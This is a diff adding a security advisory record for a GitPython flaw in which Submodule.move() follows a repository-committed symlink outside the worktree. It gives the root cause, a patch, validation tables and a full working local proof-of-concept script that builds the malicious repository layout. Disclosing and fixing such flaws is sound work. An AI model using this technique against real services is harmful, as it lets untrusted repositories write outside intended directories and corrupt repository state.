@@ -1,0 +1,174 @@
+{
+  "id": "GHSA-gq48-pqfc-9p58",
+  "modified": "2026-10-27T15:47:24.379897252Z",
+  "published": "2026-10-27T15:26:57Z",
+  "aliases": [
+    "CVE-2026-110860"
+  ],
+  "summary": "GitPython: Submodule.move() follows an attacker-committed intermediate symlink outside the worktree",
+  "details": "## Summary\n\nGitPython's public `Submodule.move()` API verifies that its destination is lexically inside the parent repository, but it does not reject symbolic links in the destination's intermediate components before filesystem operations. On systems that check out Git symlinks, an untrusted repository can therefore redirect a fixed, application-selected move destination outside the parent worktree.\n\nThe reporter reproduced this on the latest release, GitPython 3.1.62, and current `main`. In the strict scenario, the repository commits `vendor -\u003e ../outside`, while the consuming application independently passes the fixed literal `vendor/module`. `Submodule.move()` follows `vendor`, moves the initialized submodule checkout to `outside/module`, rewrites `.gitmodules` and the index to the symlinked path, and leaves the index unable to produce a tree.\n\nThe same result occurs when the committed symlink contains an absolute path to an external directory. No attacker-controlled API argument, local symlink planting, race, Git hook, unsafe-option flag, or network access during the proof is required.\n\n## Trust boundary and preconditions\n\nThe attacker controls:\n\n- an untrusted Git repository that the application clones;\n- a mode-`120000` tracked symlink named `vendor`;\n- the initialized submodule's content.\n\nThe consuming application controls the call and uses a fixed layout rule:\n\n```python\nsubmodule.move(\"vendor/module\")\n```\n\nThe trigger requires the application to initialize the submodule and later call `Submodule.move()` with a path below the attacker-committed symlink. Ordinary clone or submodule update does not automatically make this call. Windows was not tested. The primitive applies where Git materializes the tracked entry as a real symlink; on Windows that generally requires `core.symlinks=true` with Developer Mode or sufficient privilege. Configurations that materialize it as an ordinary file do not take this path.\n\n## Product and directly verified revisions\n\n- Package: `GitPython` (`pip` ecosystem)\n- Latest release: 3.1.62, tag commit `db47516dac750c5968b8f6d388b18712c355df50`\n- Current `main`: `b62e91be897f687a622e40cd1e59c33dce45f124`\n- Relevant `git/objects/submodule/base.py` SHA-256 in both revisions: `a4355d49e0b75c7c7e74d33ac70ff9550f940c977848c99da40eb41e034b189c`\n- Upstream state rechecked: 2026-09-10 KST\n\nOnly these two revisions were directly tested.\n\n## Severity and weakness\n\nThe demonstrated impact is an integrity boundary violation: repository content selects an existing directory outside the worktree, and GitPython moves an attacker-influenced checkout into a missing or empty child path there with the victim process's permissions. It also removes the original checkout and corrupts the parent repository's index/configuration state.\n\nFor a downstream service that remotely accepts repositories and performs this exact layout operation with user involvement retained, `AV:N` gives a conditional application-level score of 7.1. A fully automatic service may warrant a different `UI` assessment. The library report uses `AV:L` because the vulnerable API call is a separate application action and is not part of GitPython's ordinary clone/update flow.\n\nNo confidentiality impact, code execution, overwrite of an existing file, or overwrite of a non-empty directory was demonstrated.\n\n## Reproducer\n\nThe following script creates only temporary local repositories and a self-generated canary. It passes `protocol.file.allow=always` separately with `-c` on each fixture Git invocation; that permission is process-scoped and is not persisted to global or repository configuration.\n\nRun it from a fresh source checkout:\n\n```bash\ngit clone --depth 1 --branch 3.1.62 https://github.com/gitpython-developers/GitPython.git\npython3 poc.py /path/to/GitPython\npython3 poc.py --absolute-link /path/to/GitPython\n```\n\n`--absolute-link` commits the temporary external directory's absolute path instead of `../outside`.\n\n```python\n#!/usr/bin/env python3\n\"\"\"Local-only reproducer for GitPython Submodule.move() symlink traversal.\"\"\"\n\nfrom __future__ import annotations\n\nimport argparse\nimport json\nimport subprocess\nimport sys\nimport tempfile\nfrom pathlib import Path\nfrom typing import Optional\n\n\ndef run_git(\n    *args: str, cwd: Optional[Path] = None, check: bool = True\n) -\u003e subprocess.CompletedProcess:\n    command = [\n        \"git\",\n        \"-c\",\n        \"user.name=GitPython security fixture\",\n        \"-c\",\n        \"user.email=fixture@example.invalid\",\n        \"-c\",\n        \"protocol.file.allow=always\",\n        *args,\n    ]\n    return subprocess.run(command, cwd=cwd, check=check, text=True, capture_output=True)\n\n\ndef read_core_worktree(parent) -\u003e str:\n    module_config = Path(parent.git_dir) / \"modules\" / \"logical-name\" / \"config\"\n    return parent.git.config(\"--file\", str(module_config), \"--get\", \"core.worktree\")\n\n\ndef read_gitmodules_path(parent) -\u003e str:\n    modules_file = Path(parent.working_tree_dir) / \".gitmodules\"\n    return parent.git.config(\n        \"--file\", str(modules_file), \"--get\", \"submodule.logical-name.path\"\n    )\n\n\ndef main() -\u003e int:\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"source_root\", type=Path, help=\"GitPython source checkout\")\n    parser.add_argument(\n        \"--absolute-link\",\n        action=\"store_true\",\n        help=(\n            \"Use the temporary external directory's absolute path as the committed \"\n            \"symlink target\"\n        ),\n    )\n    args = parser.parse_args()\n\n    source_root = args.source_root.resolve()\n    # The tested GitPython source trees include gitdb and smmap at their roots.\n    sys.path[:0] = [\n        str(source_root),\n        str(source_root / \"gitdb\"),\n        str(source_root / \"smmap\"),\n    ]\n    import gitdb  # pylint: disable=import-outside-toplevel\n    import smmap  # pylint: disable=import-outside-toplevel\n    from git import Repo  # pylint: disable=import-outside-toplevel\n\n    with tempfile.TemporaryDirectory(prefix=\"gitpython-move-poc-\") as temporary:\n        root = Path(temporary)\n        module_source = root / \"module-source\"\n        attacker = root / \"attacker-parent\"\n        victim = root / \"victim-parent\"\n        outside = root / \"outside\"\n\n        run_git(\"init\", \"--quiet\", str(module_source))\n        (module_source / \"SELF_GENERATED_CANARY.txt\").write_text(\n            \"SELF_GENERATED_CANARY\\n\", encoding=\"utf-8\"\n        )\n        run_git(\"add\", \"SELF_GENERATED_CANARY.txt\", cwd=module_source)\n        run_git(\"commit\", \"--quiet\", \"-m\", \"fixture\", cwd=module_source)\n\n        outside.mkdir()\n        run_git(\"init\", \"--quiet\", str(attacker))\n        run_git(\n            \"submodule\",\n            \"add\",\n            \"--quiet\",\n            \"--name\",\n            \"logical-name\",\n            str(module_source),\n            \"module\",\n            cwd=attacker,\n        )\n        link_target = str(outside.resolve()) if args.absolute_link else \"../outside\"\n        (attacker / \"vendor\").symlink_to(link_target, target_is_directory=True)\n        run_git(\"add\", \".gitmodules\", \"module\", \"vendor\", cwd=attacker)\n        run_git(\"commit\", \"--quiet\", \"-m\", \"attacker-controlled layout\", cwd=attacker)\n\n        run_git(\"clone\", \"--quiet\", str(attacker), str(victim))\n        run_git(\"submodule\", \"update\", \"--init\", \"--quiet\", cwd=victim)\n\n        parent = Repo(victim)\n        submodule = parent.submodule(\"logical-name\")\n        before = {\n            \"status\": parent.git.status(\"--porcelain\"),\n            \"write_tree\": parent.git.write_tree(),\n            \"vendor_index\": parent.git.ls_files(\"--stage\", \"vendor\"),\n            \"index_paths\": parent.git.ls_files().splitlines(),\n            \"gitmodules_path\": read_gitmodules_path(parent),\n            \"source_canary\": (victim / \"module\" / \"SELF_GENERATED_CANARY.txt\").exists(),\n            \"external_canary\": (\n                outside / \"module\" / \"SELF_GENERATED_CANARY.txt\"\n            ).exists(),\n            \"module_core_worktree\": read_core_worktree(parent),\n        }\n\n        error = None\n        try:\n            submodule.move(\n                \"vendor/module\"\n            )  # Fixed application value; attacker does not control it.\n        # Capture the exact type and text so a patched rejection remains visible.\n        except Exception as exception:\n            error = {\"type\": type(exception).__name__, \"message\": str(exception)}\n\n        write_tree = None\n        write_tree_error = None\n        try:\n            write_tree = parent.git.write_tree()\n        except Exception as exception:\n            write_tree_error = {\n                \"type\": type(exception).__name__,\n                \"message\": str(exception),\n            }\n\n        result = {\n            \"imported_modules\": {\n                \"git\": str(Path(sys.modules[\"git\"].__file__).resolve()),\n                \"gitdb\": str(Path(gitdb.__file__).resolve()),\n                \"smmap\": str(Path(smmap.__file__).resolve()),\n            },\n            \"committed_symlink_target\": link_target,\n            \"before\": before,\n            \"call_error\": error,\n            \"after\": {\n                \"status\": parent.git.status(\"--porcelain\"),\n                \"source_canary\": (\n                    victim / \"module\" / \"SELF_GENERATED_CANARY.txt\"\n                ).exists(),\n                \"external_canary\": (\n                    outside / \"module\" / \"SELF_GENERATED_CANARY.txt\"\n                ).exists(),\n                \"index_paths\": parent.git.ls_files().splitlines(),\n                \"gitmodules\": (victim / \".gitmodules\").read_text(encoding=\"utf-8\"),\n                \"gitmodules_path\": read_gitmodules_path(parent),\n                \"submodule_path\": submodule.path,\n                \"module_core_worktree\": read_core_worktree(parent),\n                \"write_tree\": write_tree,\n                \"write_tree_error\": write_tree_error,\n            },\n        }\n        print(json.dumps(result, indent=2, sort_keys=True))\n        parent.close()\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n```\n\n## Observed result\n\nThe relative and absolute symlink variants produced the same security-relevant result on both directly tested revisions:\n\n| State | Before | After unpatched `move()` |\n| --- | --- | --- |\n| API result | not called | returns successfully |\n| Original checkout | `module/SELF_GENERATED_CANARY.txt` exists | checkout is gone |\n| External destination | `outside/module` absent | canary exists under `outside/module` |\n| Parent index | `.gitmodules`, `module`, `vendor` | `.gitmodules`, `vendor`, `vendor/module` |\n| `.gitmodules` path | `module` | `vendor/module` |\n| module `core.worktree` | `../../../module` | `../../../vendor/module` |\n| `git write-tree` | succeeds | fails |\n\nThe failure after the move is:\n\n```text\nYou have both vendor and vendor/module\nfatal: git-write-tree: error building trees\n```\n\nThe tracked attacker input is present in the clean clone before the call:\n\n```text\n120000 d09b80733baa4f6b198f2cf2d62bbfc5b6cbf1f0 0 vendor\n```\n\nWith the proposed patch, the same calls raise before mutation:\n\n```text\nValueError: Submodule checkout path 'vendor/module' contains a symbolic link\n```\n\nThe checkout, external directory, index, `.gitmodules`, and module configuration then remain unchanged, and `git write-tree` succeeds.\n\n## Root cause\n\n`Submodule._to_relative_path()` delegates to a helper that uses `abspath()`, `commonpath()`, and `relpath()` to enforce lexical containment. These operations normalize `..`, but they do not resolve or reject an existing intermediate symbolic link.\n\nThe relevant helper is `git.util._to_relative_path()`:\n\n```python\nroot_abs = osp.abspath(os.fspath(root))\npath_abs = osp.abspath(osp.join(root_abs, path_str))\ncommon_path = osp.commonpath([root_abs, path_abs])\nif common_path != root_abs:\n    raise ValueError(...)\nrelative_path = to_native_path_linux(osp.relpath(path_abs, root_abs))\n```\n\n`Submodule.move()` then joins the accepted relative path to the worktree and passes it to filesystem operations, including `os.listdir()` and `os.renames()`:\n\n```python\nmodule_checkout_path = self._to_relative_path(self.repo, module_path)\n...\nmodule_checkout_abspath = join_path_native(str(self.repo.working_tree_dir), module_checkout_path)\n...\nos.renames(cur_path, module_checkout_abspath)\n```\n\nThe operating system resolves `vendor/module` through the checked-out `vendor` link at that point.\n\nGitPython already applies the intended component check to the source checkout through `Submodule.abspath`: it walks every component and rejects `os.path.islink(path)`. The destination in `move()` does not use that guard.\n\n## Suggested fix\n\nThe proposed patch below factors the existing component walk into a shared checkout-path helper and applies it to the normalized move destination before any filesystem, index, or configuration mutation. It:\n\n- normalizes the destination exactly once;\n- preserves the existing early return for a no-op move;\n- rejects symbolic links in every intermediate destination component;\n- preserves existing final-component symlink behavior;\n- leaves `Submodule.abspath`'s all-component guard intact.\n\nThe final-component exception preserves current compatibility. The existing code first uses `isfile()` and `listdir()` to classify the link target, then uses `os.remove()` to unlink an empty-directory leaf symlink before moving the checkout. Tests confirm that an empty-directory leaf link is replaced while its target remains unchanged; non-empty-directory and file targets are rejected; a dangling leaf produces `OSError` without changing repository state. Because the pre-removal `isfile()`, `exists()`, and `listdir()` calls follow the leaf link, the existing behavior retains an existence/emptiness oracle for that external target; the proof demonstrates no write through the leaf link.\n\nThe component check closes the non-racing, attacker-committed symlink case reported here. It is not a claim of protection against a concurrent same-user process replacing a checked directory after validation; descriptor-relative traversal and rename would be needed if that separate race is in scope. Because `move()` is decorated with `@unbare_repo`, `working_tree_dir` should be present; the helper nevertheless changes an impossible or malformed `None` state from the previous `str(None)` path construction to an explicit `NotADirectoryError`.\n\n## Validation\n\nThe strict clean-clone proof was run with both relative and absolute committed symlink targets:\n\n| Revision | macOS ARM64 unpatched | Linux ARM64 unpatched | macOS patched | Linux patched |\n| --- | --- | --- | --- | --- |\n| 3.1.62 | escape reproduced | escape reproduced | rejected before mutation | rejected before mutation |\n| `main` `b62e91b` | escape reproduced | escape reproduced | rejected before mutation | rejected before mutation |\n\nBoth platforms were ARM64 on the same physical Mac; Linux ran in a local LinuxKit VM image. All runs used Python 3.14.7. The Linux runs used a local image by immutable SHA-256, with networking disabled, a read-only container root and source mount, and a temporary writable `/tmp`.\n\nPinned reproducer SHA-256: `513b6f32fc44cc74bee1ca8e81e8ed3f48ae89bfdc332dd6782886bfd1d6a79c`.\n\nThe documented shallow-clone command was also executed from a new temporary directory at 3.1.62. The reproducer resolved `git`, `gitdb`, and `smmap` from that checkout (`git/__init__.py`, `gitdb/gitdb/__init__.py`, and `smmap/smmap/__init__.py`) and reproduced the same external move. In that exact checkout, `git ls-tree HEAD gitdb smmap git/ext` reports ordinary mode-`040000` trees for root `gitdb` and `smmap`, no `.gitmodules` file exists, and `git submodule status --recursive` produces no entries. No recursive submodule checkout or preinstalled GitPython dependency was used for that bootstrap check. The evidence package includes both the raw local tree transcript and the matching official GitHub tree API entries.\n\nThe revised patch also passed 12 focused tests on each revision on each platform (48 test executions total). They cover:\n\n- relative and absolute ordinary moves from an external process working directory;\n- relative and absolute no-op ordering;\n- no-op compatibility when the stored path includes an existing symlink;\n- the unchanged `Submodule.abspath` leaf-link guard;\n- relative and absolute intermediate-link rejection before rename;\n- empty-directory, non-empty-directory, file, and dangling final-component link behavior.\n\nRuff 0.16.6 lint and format checks, Python compilation, patch application, and patched-file byte comparison passed for both revisions. GitPython's complete upstream test suite and mypy were not run against the patch; the test claim is limited to the focused matrix described above.\n\nAdditional saved controls on both revisions record rejection of `../` and absolute API destinations, preservation of existing files and non-empty directories, the final-component link behavior, and `RootModule.update()` rejecting the tested commit-to-commit symlinked path before its internal move. These controls are separate from the strict 16-run proof.\n\n## Impact limits and compatibility observations\n\n- An existing destination file and an existing non-empty destination directory are preserved and rejected.\n- A missing or empty leaf below an external symlink target can be populated.\n- `../` and an absolute API destination outside the worktree are already rejected; the bypass is filesystem resolution of a lexically in-tree path.\n- `RootModule.update()` rejects the tested commit-to-commit symlinked path before its internal `move()` call, so ordinary clone/update is not an automatic trigger.\n- The proof does not require or demonstrate a local race.\n- The directly demonstrated relative target is the practical repository-relative case. The absolute variant proves target-path scope using a temporary path known to the fixture; a remote attacker would instead need a predictable absolute directory on the victim.\n- The exact affected history before 3.1.62 has not been established.\n\n## AI assistance and credit\n\nThis report was prepared with AI assistance. The working proof was executed locally against both pinned revisions on macOS and Linux, and every reported state transition was checked against saved structured output. The proposed patch and focused tests were executed independently from the vulnerable proof.\n\nRequested credit: GitHub user `dpfkdlemtp`.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "gitpython",
+        "purl": "pkg:pypi/gitpython"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.2.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1.7",
+        "0.2.0-beta1",
+        "0.3.0-beta1",
+        "0.3.0-beta2",
+        "0.3.1-beta2",
+        "0.3.2",
+        "0.3.2.1",
+        "0.3.2.RC1",
+        "0.3.3",
+        "0.3.4",
+        "0.3.5",
+        "0.3.6",
+        "0.3.7",
+        "1.0.0",
+        "1.0.1",
+        "1.0.2",
+        "2.0.0",
+        "2.0.1",
+        "2.0.2",
+        "2.0.3",
+        "2.0.4",
+        "2.0.5",
+        "2.0.6",
+        "2.0.7",
+        "2.0.8",
+        "2.0.9",
+        "2.0.9.dev0",
+        "2.0.9.dev1",
+        "2.1.0",
+        "2.1.1",
+        "2.1.10",
+        "2.1.11",
+        "2.1.12",
+        "2.1.13",
+        "2.1.14",
+        "2.1.15",
+        "2.1.2",
+        "2.1.3",
+        "2.1.4",
+        "2.1.5",
+        "2.1.6",
+        "2.1.7",
+        "2.1.8",
+        "2.1.9",
+        "3.0.0",
+        "3.0.1",
+        "3.0.2",
+        "3.0.3",
+        "3.0.4",
+        "3.0.5",
+        "3.0.6",
+        "3.0.7",
+        "3.0.8",
+        "3.0.9",
+        "3.1.0",
+        "3.1.1",
+        "3.1.10",
+        "3.1.11",
+        "3.1.12",
+        "3.1.13",
+        "3.1.14",
+        "3.1.15",
+        "3.1.16",
+        "3.1.17",
+        "3.1.18",
+        "3.1.19",
+        "3.1.2",
+        "3.1.20",
+        "3.1.22",
+        "3.1.23",
+        "3.1.24",
+        "3.1.25",
+        "3.1.26",
+        "3.1.27",
+        "3.1.28",
+        "3.1.29",
+        "3.1.3",
+        "3.1.30",
+        "3.1.31",
+        "3.1.32",
+        "3.1.33",
+        "3.1.34",
+        "3.1.35",
+        "3.1.36",
+        "3.1.37",
+        "3.1.38",
+        "3.1.4",
+        "3.1.40",
+        "3.1.41",
+        "3.1.42",
+        "3.1.43",
+        "3.1.44",
+        "3.1.45",
+        "3.1.46",
+        "3.1.47",
+        "3.1.48",
+        "3.1.49",
+        "3.1.5",
+        "3.1.50",
+        "3.1.51",
+        "3.1.52",
+        "3.1.53",
+        "3.1.54",
+        "3.1.55",
+        "3.1.56",
+        "3.1.57",
+        "3.1.58",
+        "3.1.59",
+        "3.1.6",
+        "3.1.60",
+        "3.1.61",
+        "3.1.62",
+        "3.1.7",
+        "3.1.8",
+        "3.1.9"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-gq48-pqfc-9p58/GHSA-gq48-pqfc-9p58.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-gq48-pqfc-9p58"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/pull/2232"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/commit/24b6f95d4b90ab1483fb601c736ac6e7c059cd61"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/gitpython-developers/GitPython"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/releases/tag/3.2.0"
+    }
+  ]
+}
